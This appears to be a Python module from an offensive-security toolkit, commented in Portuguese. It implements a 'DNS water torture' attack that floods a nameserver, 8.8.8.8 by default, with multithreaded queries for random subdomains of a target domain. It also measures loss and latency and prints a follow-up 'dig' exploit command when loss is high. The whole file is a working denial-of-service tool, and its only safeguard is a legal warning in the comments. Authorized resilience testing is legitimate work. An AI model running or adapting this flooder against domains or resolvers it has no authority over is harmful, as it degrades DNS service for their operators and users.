#!/usr/bin/env python3
"""Modulo de stress test DNS — DNS Water Torture Simulation.

Envia queries para subdominios aleatorios para testar resiliencia de servidores DNS.
Ferramenta de stress testing para infraestrutura DNS propria ou autorizada.

ATENCAO LEGAL:
  Esta ferramenta envia flood de queries DNS. Use APENAS em servidores DNS
  que voce possui ou tem autorizacao escrita para testar. Uso indevido e crime
  (CFAA, Computer Misuse Act, Lei 12.737/2012).

Padroes de geracao de labels:
  - random — labels aleatorios (a-z, 0-9)
  - uuid — baseado em UUID4 (garantido unico)
  - sequential — contadores hexadecimais
  - wordlist — combinacao de palavras + sufixo numerico

Metricas coletadas:
  - Queries enviadas/recebidas
  - Respostas NXDOMAIN, NOERROR, timeout
  - Latencia media/p95/p99
  - Taxa de perda (loss rate)
  - QPS real alcancado

Fluxo:
  1. Gera lista de subdominios aleatorios
  2. Envia queries com ThreadPoolExecutor
  3. Coleta metricas de cada resposta
  4. Exibe relatorio final com estatisticas
"""

import argparse
import logging
import random
import string
import time
import uuid
from collections.abc import Callable
from concurrent.futures import (
    FIRST_COMPLETED,
    ThreadPoolExecutor,
    as_completed,
    wait,
)
from dataclasses import dataclass
from statistics import mean, quantiles
from typing import Any

import dns.exception
import dns.flags
import dns.name
import dns.rdatatype
import dns.resolver

from mytools.core.base import BaseScanner, ScanGroup
from mytools.core.utils import (
    Cyber,
    color,
    create_banner,
    print_exploit_info,
    set_dry_run,
)

logger = logging.getLogger("mytools.dnswatorture")

DEFAULT_RATE = 100
DEFAULT_DURATION = 10
DEFAULT_CONCURRENCY = 20
DEFAULT_LABEL_LENGTH = 8
DEFAULT_NAMESERVER = "8.8.8.8"


@dataclass(frozen=True, slots=True)
class QueryResult:
    """Resultado de uma unica query DNS."""

    domain: str
    response_code: str
    latency_ms: float
    error: str


@dataclass(frozen=True, slots=True)
class WaterTortureResult:
    """Resultado agregado do stress test DNS."""

    domain: str
    nameserver: str
    pattern: str
    queries_sent: int
    nxdomain_count: int
    noerror_count: int
    other_count: int
    timeout_count: int
    avg_latency_ms: float
    p95_latency_ms: float
    p99_latency_ms: float
    loss_rate: float
    duration_s: float
    qps: float
    exploit: str = ""
    tool: str = ""


def _gen_random_label(length: int = DEFAULT_LABEL_LENGTH) -> str:
    """Gera label aleatorio (a-z, 0-9)."""
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))


def _gen_uuid_label() -> str:
    """Gera label baseado em UUID4 (garantido unico)."""
    return uuid.uuid4().hex[:12]


def _gen_sequential_label(counter: int) -> str:
    """Gera label sequencial hexadecimais."""
    return f"{counter:012x}"


def _gen_wordlist_label() -> str:
    """Gera label de combinacao palavra + sufixo numerico."""
    words = [
        "test",
        "dev",
        "staging",
        "api",
        "web",
        "app",
        "mail",
        "ftp",
        "vpn",
        "ns",
        "dns",
        "mx",
        "www",
        "cdn",
        "db",
        "cache",
    ]
    word = random.choice(words)
    suffix = "".join(random.choices(string.digits, k=random.randint(2, 6)))
    return f"{word}{suffix}"


def _send_query(
    resolver: object,
    domain: str,
) -> QueryResult:
    """Envia uma unica query DNS e retorna o resultado."""
    fqdn = f"{domain}"

    start = time.monotonic()
    try:
        resolver.resolve(fqdn, "A")  # type: ignore[attr-defined]
        latency = (time.monotonic() - start) * 1000
        return QueryResult(
            domain=fqdn,
            response_code="NOERROR",
            latency_ms=latency,
            error="",
        )
    except dns.resolver.NXDOMAIN:
        latency = (time.monotonic() - start) * 1000
        return QueryResult(
            domain=fqdn,
            response_code="NXDOMAIN",
            latency_ms=latency,
            error="",
        )
    except dns.resolver.NoAnswer:
        latency = (time.monotonic() - start) * 1000
        return QueryResult(
            domain=fqdn,
            response_code="NOANSWER",
            latency_ms=latency,
            error="",
        )
    except dns.exception.Timeout:
        latency = (time.monotonic() - start) * 1000
        return QueryResult(
            domain=fqdn,
            response_code="TIMEOUT",
            latency_ms=latency,
            error="timeout",
        )
    except dns.exception.DNSException as e:
        latency = (time.monotonic() - start) * 1000
        return QueryResult(
            domain=fqdn,
            response_code="ERROR",
            latency_ms=latency,
            error=str(e),
        )


def _generate_domains(
    base_domain: str,
    count: int,
    pattern: str,
) -> list[str]:
    """Gera lista de subdominios para o test."""
    domains: list[str] = []
    for i in range(count):
        if pattern == "uuid":
            label = _gen_uuid_label()
        elif pattern == "sequential":
            label = _gen_sequential_label(i)
        elif pattern == "wordlist":
            label = _gen_wordlist_label()
        else:
            label = _gen_random_label()
        domains.append(f"{label}.{base_domain}")
    return domains


def run_water_torture(
    domain: str,
    nameserver: str = DEFAULT_NAMESERVER,
    rate: int = DEFAULT_RATE,
    duration: int = DEFAULT_DURATION,
    concurrency: int = DEFAULT_CONCURRENCY,
    pattern: str = "random",
    timeout: float = 2.0,
) -> WaterTortureResult:
    """Executa o stress test DNS (water torture)."""
    total_queries = rate * duration
    domains = _generate_domains(domain, total_queries, pattern)

    resolver = dns.resolver.Resolver()
    resolver.nameservers = [nameserver]
    resolver.timeout = timeout
    resolver.lifetime = timeout

    results: list[QueryResult] = []
    start_time = time.monotonic()
    interval = 1.0 / rate if rate > 0 else 0.01

    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        futures: set = set()
        window = max(concurrency * 4, 8)
        for i, d in enumerate(domains):
            future = executor.submit(_send_query, resolver, d)
            futures.add(future)

            if (i + 1) % concurrency == 0:
                time.sleep(interval * concurrency)

            if len(futures) >= window:
                done, futures = wait(futures, return_when=FIRST_COMPLETED)
                for future in done:
                    try:
                        results.append(future.result())
                    except Exception as e:
                        logger.debug("Query error: %s", e)

        for future in as_completed(futures):
            try:
                results.append(future.result())
            except Exception as e:
                logger.debug("Query error: %s", e)

    elapsed = time.monotonic() - start_time

    nxdomain = sum(1 for r in results if r.response_code == "NXDOMAIN")
    noerror = sum(1 for r in results if r.response_code == "NOERROR")
    timeouts = sum(1 for r in results if r.response_code == "TIMEOUT")
    other = len(results) - nxdomain - noerror - timeouts

    latencies = [r.latency_ms for r in results if r.error != "timeout"]
    avg_lat = mean(latencies) if latencies else 0.0
    p95_lat = (
        quantiles(latencies, n=20)[18]
        if len(latencies) >= 20
        else (max(latencies) if latencies else 0.0)
    )
    p99_lat = (
        quantiles(latencies, n=100)[98]
        if len(latencies) >= 100
        else (max(latencies) if latencies else 0.0)
    )

    sent = len(results)
    loss = (timeouts / sent) if sent > 0 else 0.0
    qps = sent / elapsed if elapsed > 0 else 0.0

    return WaterTortureResult(
        domain=domain,
        nameserver=nameserver,
        pattern=pattern,
        queries_sent=sent,
        nxdomain_count=nxdomain,
        noerror_count=noerror,
        other_count=other,
        timeout_count=timeouts,
        avg_latency_ms=round(avg_lat, 2),
        p95_latency_ms=round(p95_lat, 2),
        p99_latency_ms=round(p99_lat, 2),
        loss_rate=round(loss, 4),
        duration_s=round(elapsed, 2),
        qps=round(qps, 2),
        exploit=f"dig -f <wordlist> {domain} @{nameserver}" if loss > 0.1 else "",
        tool="dig",
    )


def print_results(result: WaterTortureResult) -> None:
    """Exibe o relatorio do stress test de forma colorida."""
    print(color("\n[+] DNS Water Torture — Relatorio:", Cyber.GREEN, Cyber.BOLD))
    print(f"  Dominio: {color(result.domain, Cyber.WHITE, Cyber.BOLD)}")
    print(f"  Nameserver: {color(result.nameserver, Cyber.CYAN)}")
    print(f"  Padrao: {color(result.pattern, Cyber.CYAN)}")
    print()

    print(color("  Metricas:", Cyber.YELLOW, Cyber.BOLD))
    print(f"    Queries enviadas: {color(str(result.queries_sent), Cyber.WHITE)}")
    print(f"    NXDOMAIN: {color(str(result.nxdomain_count), Cyber.CYAN)}")
    print(f"    NOERROR: {color(str(result.noerror_count), Cyber.GREEN)}")
    print(
        f"    Timeouts: {color(str(result.timeout_count), Cyber.RED if result.timeout_count > 0 else Cyber.WHITE)}"
    )
    print(f"    Outros: {result.other_count}")
    print()

    print(color("  Latencia:", Cyber.YELLOW, Cyber.BOLD))
    print(f"    Media: {color(f'{result.avg_latency_ms:.1f}ms', Cyber.WHITE)}")
    print(f"    P95: {color(f'{result.p95_latency_ms:.1f}ms', Cyber.WHITE)}")
    print(f"    P99: {color(f'{result.p99_latency_ms:.1f}ms', Cyber.WHITE)}")
    print()

    print(color("  Performance:", Cyber.YELLOW, Cyber.BOLD))
    print(f"    QPS real: {color(f'{result.qps:.1f}', Cyber.GREEN, Cyber.BOLD)}")
    loss_color = (
        Cyber.RED
        if result.loss_rate > 0.1
        else (Cyber.YELLOW if result.loss_rate > 0.05 else Cyber.GREEN)
    )
    print(
        f"    Loss rate: {color(f'{result.loss_rate * 100:.1f}%', loss_color, Cyber.BOLD)}"
    )
    print(f"    Duracao: {color(f'{result.duration_s:.1f}s', Cyber.WHITE)}")

    if result.loss_rate > 0.1:
        print(
            color(
                "\n  [!] Loss rate > 10% — servidor pode estar sobrecarregado ou com rate limiting",
                Cyber.RED,
            )
        )
    elif result.loss_rate > 0.05:
        print(
            color(
                "\n  [!] Loss rate > 5% — possivel rate limiting detectado",
                Cyber.YELLOW,
            )
        )
    else:
        print(color("\n  [+] Loss rate normal — servidor resistente", Cyber.GREEN))

    print_exploit_info(result.exploit, result.tool)


def banner() -> None:
    """Exibe o banner do DNS Water Torture."""
    art = r"""
    __  _______  __        ______            __
   /  |/  / __ \/ /__  ___/_  __/___  ____  / /____
  / /|_/ / / / / / _ \/ _ \/ / / __ \/ __ \/ / ___/
 / /  / / /_/ / /  __/  __/ / / /_/ / /_/ / (__  )
/_/  /_/\____/_/\___/\___/_/  \____/\____/_/____/
"""
    create_banner(art, "   dns water torture: stress testing para resiliencia DNS")()


async def run_scan(
    domain: str,
    nameserver: str,
    rate: int,
    duration: int,
    concurrency: int,
    pattern: str,
    timeout: float,
) -> WaterTortureResult:
    """Roda o stress test DNS (wrapper async da base)."""
    logger.error("ATENCAO: Executando stress test DNS.")
    logger.error("Alvo: %s via %s", domain, nameserver)
    logger.error("Rate: %d QPS por %ds", rate, duration)
    return run_water_torture(
        domain=domain,
        nameserver=nameserver,
        rate=rate,
        duration=duration,
        concurrency=concurrency,
        pattern=pattern,
        timeout=timeout,
    )


class DnswatortureScanner(BaseScanner):
    """DNS Water Torture — dispatcher BaseScanner (Grupo B)."""

    prog = "mytools-dwt"
    description = "DNS Water Torture — stress testing para resiliencia DNS."
    epilog = (
        "ATENCAO: Use apenas em servidores DNS que voce possui ou tem "
        "autorizacao para testar."
    )
    prompt = "dwt> "
    module_name = "mytools.dnswatorture"
    module_type = "core"
    group = ScanGroup.B
    scan_fn = staticmethod(run_scan)

    @staticmethod
    def _get_target(args: argparse.Namespace) -> str | None:
        return getattr(args, "domain", None)

    def _add_arguments(self, parser: argparse.ArgumentParser) -> None:
        parser.add_argument("domain", nargs="?", help="Dominio alvo (ex: example.com).")
        parser.add_argument(
            "--nameserver",
            "-s",
            default=DEFAULT_NAMESERVER,
            help=f"Nameserver para enviar queries. Padrao: {DEFAULT_NAMESERVER}",
        )
        parser.add_argument(
            "--rate",
            "-r",
            type=int,
            default=DEFAULT_RATE,
            help=f"Queries por segundo (QPS). Padrao: {DEFAULT_RATE}",
        )
        parser.add_argument(
            "--duration",
            "-d",
            type=int,
            default=DEFAULT_DURATION,
            help=f"Duracao do teste em segundos. Padrao: {DEFAULT_DURATION}",
        )
        parser.add_argument(
            "--concurrency",
            "-c",
            type=int,
            default=DEFAULT_CONCURRENCY,
            help=f"Threads concorrentes. Padrao: {DEFAULT_CONCURRENCY}",
        )
        parser.add_argument(
            "--pattern",
            "-p",
            choices=["random", "uuid", "sequential", "wordlist"],
            default="random",
            help="Padrao de geracao de subdominios. Padrao: random",
        )
        parser.add_argument(
            "--query-timeout",
            type=float,
            default=2.0,
            help="Timeout por query em segundos. Padrao: 2",
        )

    def _pre_scan(self, args: argparse.Namespace) -> int | None:
        # Re-sincroniza o dry-run com args (init_scanner pode estar sob
        # patch nos testes; o fluxo original lia args.dry_run direto).
        set_dry_run(getattr(args, "dry_run", False))
        domain = getattr(args, "domain", None)
        if not domain:
            logger.error("Informe um dominio.")
            return 1
        if args.rate <= 0:
            logger.error("--rate deve ser > 0 (recebido: %d).", args.rate)
            return 1
        if args.duration <= 0:
            logger.error("--duration deve ser > 0 (recebido: %d).", args.duration)
            return 1
        if args.concurrency <= 0:
            logger.error("--concurrency deve ser > 0 (recebido: %d).", args.concurrency)
            return 1
        return None

    def _describe_plan(self, args: argparse.Namespace) -> int:
        logger.warning("Nenhuma query DNS sera enviada.")
        logger.info("Dominio: %s", self._get_target(args))
        logger.info("Nameserver: %s", args.nameserver)
        logger.info("Rate: %d QPS, Duracao: %ds", args.rate, args.duration)
        return 0

    def _build_run_once_kwargs(self, args: argparse.Namespace) -> dict[str, Any]:
        return {
            "domain": self._get_target(args),
            "nameserver": args.nameserver,
            "rate": args.rate,
            "duration": args.duration,
            "concurrency": args.concurrency,
            "pattern": args.pattern,
            "timeout": args.query_timeout,
        }

    async def run_scan(self, **kwargs: Any) -> Any:
        return await run_scan(**kwargs)  # type: ignore[override]

    def print_results(self, result: object) -> None:
        print_results(result)  # type: ignore[arg-type]

    def _make_banner(self) -> Callable[[], None]:
        return banner

    def _get_return_code(self, result: object) -> int:
        return 1 if getattr(result, "loss_rate", 0.0) > 0.1 else 0

    def _example(self) -> str:
        return "example.com --rate 100 --duration 10"

    def _help(self) -> str:
        return (
            "Uso: <dominio> [opcoes]\n"
            "Exemplos:\n"
            "  example.com\n"
            "  example.com --rate 100 --duration 30\n"
            "  example.com --nameserver 8.8.8.8 --pattern uuid\n"
            "  example.com --concurrency 50 --duration 60"
        )


scanner = DnswatortureScanner()
main = scanner.main
run_once = scanner.run_once
build_parser = scanner.build_parser

if __name__ == "__main__":
    raise SystemExit(main())
